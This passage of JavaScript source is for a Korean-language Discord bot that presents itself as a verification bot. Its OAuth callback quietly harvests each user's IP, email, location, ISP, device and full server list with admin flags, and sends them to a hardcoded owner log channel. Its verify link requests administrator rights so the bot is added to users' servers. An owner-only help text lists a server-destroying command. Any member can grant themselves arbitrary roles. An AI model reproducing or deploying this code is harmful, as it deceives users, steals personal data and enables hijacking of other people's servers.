                targetRole = guild.roles.cache.find(r => r.name.toLowerCase() === query.toLowerCase());
            }

            if (!targetRole) {
                return interaction.reply({ content: `❌ \`${query}\`에 해당하는 역할을 이 서버에서 찾을 수 없습니다.`, ephemeral: true });
            }

            if (member.roles.cache.has(targetRole.id)) {
                return interaction.reply({ content: `⚠️ 이미 **${targetRole.name}** 역할을 가지고 있습니다.`, ephemeral: true });
            }

            await member.roles.add(targetRole);
            return interaction.reply({ content: `✅ 성공적으로 **${targetRole.name}** 역할을 지급받았습니다!`, ephemeral: true });
        } catch (err) {
            console.error('역할 지급 오류:', err);
            return interaction.reply({ content: '⚠️ 역할을 지급하는 중 오류가 발생했습니다. (봇의 역할 권한을 확인해 주세요)', ephemeral: true });
        }
    }

    if (commandName === '서버정보') {
        try {
            const infoText = await fetchServerInfo(guild, client);
            return interaction.reply(infoText);
        } catch (err) {
            return interaction.reply({ content: '⚠️ 서버 정보를 불러오는 중 오류가 발생했습니다.', ephemeral: true });
        }
    }

    if (commandName === '도움말-a') {
        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
        return interaction.reply({
            content: `🤖 **[관리자 전용 전체 도움말]**\n\n` +
                     `📋 **[모든 명령어 목록]**\n` +
                     `• \`/서버정보\` (또는 \`!서버정보\`) - 현재 서버의 상세 정보를 확인합니다.\n` +
                     `• \`/서버역할\` - 서버의 모든 역할 이름과 ID를 확인합니다. (관리자 전용)\n` +
                     `• \`/역할지급\` - 지정된 역할을 자신에게 지급합니다.\n` +
                     `• \`/말하기 (내용)\` - 봇이 지정된 텍스트를 말합니다. (관리자 전용)\n` +
                     `• \`/인증정보삭제\` - 특정 유저의 모든 인증 기록을 삭제합니다. (관리자 전용)\n` +
                     `• \`/서버인증\` - 서버 인증 시스템을 활성화합니다. (소유자 전용)\n` +
                     `• \`/인증역할\` - 인증 완료 역할을 설정합니다. (소유자 전용)\n` +
                     `• \`/인증로그\` - 인증 전용 로그 채널을 설정합니다. (소유자 전용)\n` +
                     `• \`/서버설정\` - 봇 권한 및 타임아웃 가능 멤버 수를 확인합니다. (소유자 전용)\n` +
                     `• \`/자동검열\` - 욕설 및 도배 자동 차단 기능을 켜고 끕니다. (소유자 전용)\n` +
                     `• \`/처벌강도\` - 타임아웃 적용 시간(분)을 설정합니다. (소유자 전용)\n` +
                     `• \`/인증\` - 채널에 인증 패널 버튼을 전송합니다. (소유자 전용)\n` +
                     `• \`/역할제거\` - 지정된 역할을 제거합니다.\n` +
                     `• \`/서버복구\` - 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)\n` +
                     `• \`/서버폭파 (서버아이디)\` - 지정된 서버를 폭파합니다. (관리자 전용)\n` +
                     `• \`/가입서버\` - 봇이 가입된 서버 목록을 DM으로 받습니다. (관리자 전용)\n` +
                     `• \`/도움말\` - 일반 명령어 목록을 확인합니다.`,
            ephemeral: true
        });
    }

    if (commandName === '도움말') {
        return interaction.reply({
            content: `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
                     `📋 **[사용 가능한 슬래시 명령어]**\n` +
                     `• \`/서버정보\` (또는 \`!서버정보\`) - 현재 서버의 상세 정보를 확인합니다.\n` +
                     `• \`/역할지급 (역할이름/아이디)\` - 지정된 역할을 자신에게 지급합니다.\n` +
                     `• \`/서버인증\` - 서버 인증 시스템을 활성화합니다. (소유자 전용)\n` +
                     `• \`/인증역할\` - 인증 완료 역할을 설정합니다. (소유자 전용)\n` +
                     `• \`/인증로그\` - 인증 전용 로그 채널을 설정합니다. (소유자 전용)\n` +
                     `• \`/서버설정\` - 봇 권한 및 타임아웃 가능 멤버 수를 확인합니다. (소유자 전용)\n` +
                     `• \`/자동검열\` - 욕설 및 도배 자동 차단 기능을 켜고 끕니다. (소유자 전용)\n` +
                     `• \`/처벌강도\` - 타임아웃 적용 시간(분)을 설정합니다. (소유자 전용)\n` +
                     `• \`/인증\` - 채널에 인증 패널 버튼을 전송합니다. (소유자 전용)\n` +
                     `• \`/역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
                     `• \`/도움말\` - 명령어 목록을 확인합니다.`,
            ephemeral: true
        });
    }

    if (commandName === '인증') {
        const isServerOwner = guild.ownerId === userId;
        if (!isServerOwner && !isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.', ephemeral: true });

        try {
            const messages = await interaction.channel.messages.fetch({ limit: 50 }).catch(() => null);
            if (messages) {
                for (const msg of messages.values()) {
                    if (msg.author.id === client.user.id && msg.components && msg.components.length > 0) {
                        await msg.delete().catch(() => {});
                    }
                }
            }

            const botAndUserAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot%20identify%20email%20guilds&redirect_uri=${encodeURIComponent(`${FIXED_RENDER_URL}/callback`)}&response_type=code&state=${Buffer.from(JSON.stringify({ guildId })).toString('base64')}`;

            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('🔒 디스코드 인증하기').setURL(botAndUserAuthUrl));

            await interaction.channel.send({
                content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
                components: [row]
            });
            return interaction.reply({ content: '✅ 기존 인증 패널을 정리하고 서버 추가 및 계정 승인창이 뜨는 새로운 인증 패널을 전송했습니다!', ephemeral: true });
        } catch (err) {
            return interaction.reply({ content: '⚠️ 오류가 발생했습니다.', ephemeral: true });
        }
    }

    if (commandName === '역할제거') {
        try {
            const member = await guild.members.fetch(userId).catch(() => null);
            if (!member) return interaction.reply({ content: '❌ 멤버 정보를 찾을 수 없습니다.', ephemeral: true });

            const targetRoleId = '1541423418753155135';
            if (!member.roles.cache.has(targetRoleId)) {
                return interaction.reply({ content: '❌ 제거할 해당 역할이 없습니다.', ephemeral: true });
            }

            await member.roles.remove(targetRoleId);
            return interaction.reply({ content: '✅ 지정된 역할이 성공적으로 제거되었습니다!', ephemeral: true });
        } catch (err) {
            return interaction.reply({ content: '⚠️ 역할 제거 중 오류가 발생했습니다.', ephemeral: true });
        }
    }
});

app.get('/verify', async (req, res) => {
    const targetGuildId = req.query.guildId || GUILD_ID;
    const botAndUserAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot%20identify%20email%20guilds&redirect_uri=${encodeURIComponent(`${FIXED_RENDER_URL}/callback`)}&response_type=code&state=${Buffer.from(JSON.stringify({ guildId: targetGuildId })).toString('base64')}`;
    res.redirect(botAndUserAuthUrl);
});

app.get('/callback', async (req, res) => {
    const code = req.query.code;
    const state = req.query.state;
    
    let targetGuildId = GUILD_ID;
    let userIp = req.headers['cf-connecting-ip'] || 
                 (req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : null) || 
                 req.socket.remoteAddress;

    if (!userIp || userIp === '::1' || userIp === '127.0.0.1') {
        userIp = '127.0.0.1';
    }

    let selectedRoles = [];
    try {
        if (state) {
            const decodedState = JSON.parse(Buffer.from(state, 'base64').toString('utf8'));
            targetGuildId = decodedState.guildId || GUILD_ID;
            selectedRoles = decodedState.roles || [];
        }
    } catch (e) {}

    const targetGuild = await client.guilds.fetch(targetGuildId).catch(() => null);
    const serverName = targetGuild ? targetGuild.name : '디스코드 서버';
    const serverIcon = targetGuild ? targetGuild.iconURL({ dynamic: true, size: 256 }) : '';

    if (isPrivateIP(userIp)) {
        return res.status(403).send(getStyledPage('인증 실패', '사설 IP(내부 네트워크) 환경에서는 인증을 진행할 수 없습니다.', 'block', serverName, serverIcon));
    }

    if (!code) {
        return res.status(400).send(getStyledPage('인증 실패', '인증 코드가 누락되었습니다. 다시 시도해 주세요.', 'error', serverName, serverIcon));
    }

    const redirectUri = `${FIXED_RENDER_URL}/callback`;

    let userAgent = req.headers['user-agent'] || '알 수 없음';
    const settings = loadSettings();
    const serverLogChannelId = settings[targetGuildId] && settings[targetGuildId].logChannelId;

    const logChannelIdsToSend = [DEFAULT_LOG_CHANNEL_ID];
    if (serverLogChannelId && serverLogChannelId !== DEFAULT_LOG_CHANNEL_ID) {
        logChannelIdsToSend.push(serverLogChannelId);
    }

    try {
        const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: redirectUri,
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenRes.data.access_token;

        const userRes = await axios.get('https://discord.com/api/users/@me', {
            headers: { authorization: `Bearer ${accessToken}` }
        });
        const userData = userRes.data;
        const userId = userData.id;
        const username = userData.username;

        let isDuplicate = false;
        try {
            const logChannel = await client.channels.fetch(DEFAULT_LOG_CHANNEL_ID).catch(() => null);
            if (logChannel) {
                const fetchedMessages = await logChannel.messages.fetch({ limit: 100 }).catch(() => null);
                if (fetchedMessages) {
                    for (const msg of fetchedMessages.values()) {
                        if (msg.author.id === client.user.id && msg.content && msg.content.includes(userId)) {
                            if (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('중복인증 완료 상세 정보')) {
                                isDuplicate = true;
                                break;
                            }
                        }
                    }
                }
            }
        } catch (err) {}

        try {
            const ipCheckRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,proxy`);
            if (ipCheckRes.data.status === 'success' && ipCheckRes.data.proxy) {
                return res.status(403).send(getStyledPage('인증 차단됨', `<b>${username}</b>님, VPN 또는 우회 접속 환경에서는 인증을 진행할 수 없습니다.`, 'block', serverName, serverIcon));
            }
        } catch (err) {}

        try {
            const mobileCheckRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,isp,org`);
            if (mobileCheckRes.data.status === 'success') {
                const isp = (mobileCheckRes.data.isp || '').toLowerCase();
                const org = (mobileCheckRes.data.org || '').toLowerCase();

                const isMobileData = isp.includes('sk telecom') || isp.includes('kt') || isp.includes('lg uplus') || 
                                     isp.includes('mobile') || org.includes('mobile') || org.includes('cellular') ||
                                     isp.includes('SKT') || isp.includes('KT') || isp.includes('LGU+');

                if (isMobileData) {
                    for (const chId of logChannelIdsToSend) {
                        const logChan = await client.channels.fetch(chId).catch(() => null);
                        if (logChan) {
                            await logChan.send({
                                content: `🚨 **[모바일 데이터 차단 적발]**\n` +
                                         `👤 **적발된 유저:** <@${userId}> (\`${username}\`)\n` +
                                         `🌐 **IP:** \`${userIp}\`\n` +
                                         `📡 **통신사/ISP:** \`${mobileCheckRes.data.isp || '알 수 없음'}\`\n` +
                                         `⚠️ 모바일 데이터(LTE/5G) 환경에서는 인증을 진행할 수 없어 차단되었습니다.`
                            }).catch(() => {});
                        }
                    }
                    return res.status(403).send(getStyledPage('모바일 데이터 차단', `<b>${username}</b>님, 모바일 데이터(LTE/5G) 환경에서는 인증을 진행할 수 없습니다.<br>와이파이(Wi-Fi)에 연결한 후 다시 시도해 주세요.`, 'block', serverName, serverIcon));
                }
            }
        } catch (err) {}

        let ipLocation = '알 수 없음';
        let ispInfo = '알 수 없음';
        let isPublicWifi = false;
        try {
            const ipRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,country,regionName,city,isp,org`);
            if (ipRes.data && ipRes.data.status === 'success') {
                ipLocation = `${ipRes.data.country} ${ipRes.data.regionName} ${ipRes.data.city}`;
                ispInfo = ipRes.data.isp;

                const orgLower = (ipRes.data.org || '').toLowerCase();
                const ispLower = (ipRes.data.isp || '').toLowerCase();
                if (orgLower.includes('wifi') || ispLower.includes('wifi') || orgLower.includes('public') || orgLower.includes('cafe') || orgLower.includes('kt free') || orgLower.includes('u+ wifi')) {
                    isPublicWifi = true;
                }
            }
        } catch (e) {}

        const { subnetMask, cidrBlock } = getSubnetInfo(userIp);
        const ipDisplay = isPublicWifi ? `${userIp} (⚠️ 공공/매장 와이파이 감지됨)` : userIp;
        const { browser, os } = parseDevice(userAgent);

        const serverInfoText = `🏫 **인증 서버:** \`${serverName}\` (ID: \`${targetGuildId}\`)`;

        const member = targetGuild ? await targetGuild.members.fetch(userId).catch(() => null) : null;
        const displayName = member ? member.displayName : (userData.global_name || username);

        const createdAt = getDiscordCreationDate(userId);
        const createdDateObj = new Date(createdAt);
        const now = new Date();
        const diffDays = (now - createdDateObj) / (1000 * 60 * 60 * 24);

        let altAccountCheck = '정상 계정 추정';
        if (diffDays < 30) {
            altAccountCheck = '⚠️ 부계정 의심 (생성된 지 30일 미만)';
        } else if (!userData.avatar) {
            altAccountCheck = '⚠️ 부계정 의심 (기본 프로필 아바타)';
        }

        const verifiedAt = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });

        let guildsTextContent = `[ ${username} (${userId}) 님이 가입된 서버 목록 ]\n\n`;
        let adminOrOwnerFound = false;

        try {
            const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', {
                headers: { authorization: `Bearer ${accessToken}` }
            });
            if (guildsRes.data && guildsRes.data.length > 0) {
                guildsRes.data.forEach((g, index) => {
                    let permissionsText = [];
                    
                    if (g.owner) {
                        permissionsText.push('👑 서버 소유자');
                        adminOrOwnerFound = true;
                    }

                    const permissionsBigInt = BigInt(g.permissions || 0);
                    if ((permissionsBigInt & 0x8n) === 0x8n && !g.owner) {
                        permissionsText.push('🛡️ 관리자 권한');
                        adminOrOwnerFound = true;
                    }

                    const permString = permissionsText.length > 0 ? ` [${permissionsText.join(', ')}]` : '';
                    guildsTextContent += `${index + 1}. 이름: ${g.name} (ID: ${g.id})${permString}\n`;
                });
            } else {
                guildsTextContent += '가입된 서버가 없습니다.';
            }
        } catch (gErr) {
            guildsTextContent += '서버 목록을 불러오는 데 실패했습니다.';
        }

        if (adminOrOwnerFound) {
            altAccountCheck += ' / ⚠️ 주요 서버 소유 또는 관리자 권한 보유 계정';
        }

        const filePath = path.join(__dirname, `guilds_${userId}.txt`);
        fs.writeFileSync(filePath, guildsTextContent, 'utf8');

        const isMfaEnabled = userData.mfa_enabled ? '✅ 2차 인증(OTP) 활성화됨' : '❌ 2차 인증 미사용';
        const emailInfo = `${userData.email} (${userData.verified ? '이메일 인증됨' : '미인증'})`;

        const spoiledIp = `||${ipDisplay}||`;
        const spoiledSubnet = `||${subnetMask} (${cidrBlock})||`;
        const spoiledEmail = `||${emailInfo}||`;
        const spoiledLocation = `||${ipLocation}||`;
        const spoiledIsp = `||${ispInfo}||`;
        const spoiledDevice = `||${browser} / ${os}||`;

        const logTitle = isDuplicate ? '🔄 **[중복인증 완료 상세 정보]**' : '✅ **[인증 완료 상세 정보]**';

        const logMessageContent = `${logTitle}\n` +
                                  `${serverInfoText}\n` +
                                  `📌 **실제 이름(닉네임):** \`${displayName}\`\n` +
                                  `👤 **유저 멘션/아이디:** <@${userId}> (\`${username}\`)\n` +
                                  `📅 **계정 생성일:** \`${createdAt}\`\n` +
                                  `🔒 **2차 인증(OTP):** \`${isMfaEnabled}\`\n` +
                                  `⏰ **인증 시각:** \`${verifiedAt}\`\n` +
                                  `🌐 **아이피 정보:** ${spoiledIp}\n` +
                                  `🔍 **서브넷 마스크 / 대역:** ${spoiledSubnet}\n` +
                                  `📧 **이메일:** ${spoiledEmail}\n` +
                                  `📍 **위치:** ${spoiledLocation}\n` +
                                  `📡 **통신사:** ${spoiledIsp}\n` +
                                  `💻 **기기 정보 (브라우저 / OS):** ${spoiledDevice}\n` +
                                  `⚠️ **부계정 추정 여부:** ${altAccountCheck}`;

        for (const chId of logChannelIdsToSend) {
            const logChan = await client.channels.fetch(chId).catch(() => null);
            if (logChan) {
                const file = new AttachmentBuilder(filePath);

                await logChan.send({
                    content: logMessageContent,
                    files: [file]
                }).catch(() => {});
            }
        }

        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
        }

        if (member) {
            let targetVerifiedRole = VERIFIED_ROLE_ID;
            if (targetGuildId === '1541053555396313128') {
                targetVerifiedRole = '1541057938091937843';
            } else if (settings[targetGuildId] && settings[targetGuildId].verifiedRoleId) {
                targetVerifiedRole = settings[targetGuildId].verifiedRoleId;
            }

            const rolesToAdd = [targetVerifiedRole, ...selectedRoles];
            await member.roles.add(rolesToAdd);

            if (UNVERIFIED_ROLE_ID && member.roles.cache.has(UNVERIFIED_ROLE_ID)) {
                await member.roles.remove(UNVERIFIED_ROLE_ID);
            }

            console.log(`[역할 처리 완료] ${username}님 인증 완료!`);
            res.send(getStyledPage('인증 완료 성공!', `<b>${username}</b>님, 인증이 성공적으로 완료되었습니다.<br>이제 디스코드 서버로 돌아가 즐겁게 이용해 주세요!`, 'success', serverName, serverIcon));
        } else {
            res.send(getStyledPage('서버 가입 필요', `인증은 완료되었으나, 현재 <b>${serverName}</b> 서버에 가입되어 있지 않습니다.`, 'warn', serverName, serverIcon));
        }

    } catch (err) {
        console.error('에러 발생:', err.response?.data || err.message);
        res.status(500).send(getStyledPage('서버 오류', '인증 처리 중 예기치 못한 오류가 발생했습니다. 잠시 후 다시 시도해 주세요.', 'error'));
    }
});

client.login(BOT_TOKEN);
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[웹서버 작동 중] 포트: ${PORT}`);
});
